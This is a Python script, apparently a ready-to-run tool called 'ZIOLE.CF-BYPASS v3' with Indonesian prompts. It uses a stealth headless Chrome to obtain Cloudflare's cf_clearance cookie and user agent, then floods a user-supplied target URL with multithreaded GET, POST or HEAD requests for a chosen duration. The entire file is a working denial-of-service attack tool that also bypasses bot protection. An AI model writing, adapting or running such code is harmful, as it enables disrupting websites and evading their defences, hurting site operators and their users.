import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
import requests, threading, time, socket, os

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

BANNER = f"""{CYAN}
███████╗██╗ ██████╗ ██╗     ███████╗
██╔════╝██║██╔═══██╗██║     ██╔════╝
█████╗  ██║██║   ██║██║     █████╗  
██╔══╝  ██║██║   ██║██║     ██╔══╝  
██║     ██║╚██████╔╝███████╗███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝
 {RESET}        {YELLOW}ZIOLE.CF-BYPASS v3 | MULTI-MODE{RESET}
"""

def valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def extract_host(url):
    return url.replace("http://", "").replace("https://", "").split("/")[0]

def cek_port(ip, port):
    try:
        sock = socket.create_connection((ip, port), timeout=3)
        sock.close()
        return True
    except:
        return False

def get_cf_cookie(target):
    print(f"{YELLOW}[•] Launching Chrome Stealth Mode...{RESET}")
    options = uc.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-blink-features=AutomationControlled")
    driver = uc.Chrome(options=options)
    driver.get(target)
    time.sleep(6)
    cookies = driver.get_cookies()
    cf_clearance = None
    for c in cookies:
        if c['name'] == 'cf_clearance':
            cf_clearance = c['value']
    ua = driver.execute_script("return navigator.userAgent")
    driver.quit()
    if not cf_clearance:
        print(f"{RED}[x] Gagal mendapatkan cf_clearance.{RESET}")
        exit()
    print(f"{GREEN}[✓] cf_clearance token: {cf_clearance[:10]}...{RESET}")
    print(f"{GREEN}[✓] User-Agent: {ua[:30]}...{RESET}")
    return cf_clearance, ua

def attack(target, cf_clearance, ua, duration, threads, mode):
    timeout = time.time() + duration
    def send():
        s = requests.Session()
        s.headers.update({
            "User-Agent": ua,
            "Cookie": f"cf_clearance={cf_clearance}"
        })
        while time.time() < timeout:
            try:
                if mode == "get":
                    res = s.get(target, timeout=5)
                elif mode == "post":
                    res = s.post(target, data={"ziole": "AR.code"}, timeout=5)
                elif mode == "head":
                    res = s.head(target, timeout=5)
                else:
                    print(f"{RED}[!] Invalid mode: {mode}{RESET}")
                    break
                print(f"{GREEN}[✓] {mode.upper()} {target} -> {res.status_code}{RESET}")
            except Exception as e:
                print(f"{RED}[x] ERR: {e}{RESET}")
    for _ in range(threads):
        threading.Thread(target=send, daemon=True).start()
    while time.time() < timeout:
        remaining = int(timeout - time.time())
        print(f"\r{CYAN}[*] Menyerang... {remaining}s tersisa...{RESET}", end='')
        time.sleep(1)

if __name__ == "__main__":
    os.system("clear" if os.name != "nt" else "cls")
    print(BANNER)
    try:
        target = input(f"{CYAN}[?] Masukkan target URL (https://...): {RESET}").strip()
        while not valid_url(target):
            target = input(f"{RED}[!] URL tidak valid. Masukkan lagi (https://...): {RESET}").strip()

        host = extract_host(target)
        print(f"{YELLOW}[•] Cek koneksi ke host: {host}...{RESET}")
        ip = socket.gethostbyname(host)

        port = 443 if target.startswith("https://") else 80
        if not cek_port(ip, port):
            print(f"{RED}[x] Port {port} di {ip} tidak bisa diakses!{RESET}")
            exit()
        else:
            print(f"{GREEN}[✓] Port {port} terbuka di {ip}{RESET}")

        duration = int(input(f"{CYAN}[?] Durasi serangan (detik): {RESET}"))
        threads = int(input(f"{CYAN}[?] Jumlah thread (misal 200): {RESET}"))
        mode = input(f"{CYAN}[?] Mode serangan (get/post/head): {RESET}").strip().lower()
        while mode not in ["get", "post", "head"]:
            mode = input(f"{RED}[!] Mode tidak valid. Pilih get/post/head: {RESET}").strip().lower()

        print(f"\n{YELLOW}[•] Siap-siap ngebypass CF...{RESET}")
        cf, ua = get_cf_cookie(target)

        print(f"\n{YELLOW}[•] Mulai {mode.upper()} attack ke {target} selama {duration}s dengan {threads} thread...{RESET}")
        attack(target, cf, ua, duration, threads, mode)

        print(f"\n\n{GREEN}[✓] DONE! ZIOLE STRIKES COMPLETE 💥{RESET}")

    except KeyboardInterrupt:
        print(f"\n{RED}[x] Dibatalin sama user.{RESET}")
    except Exception as err:
        print(f"{RED}[x] Error: {err}{RESET}")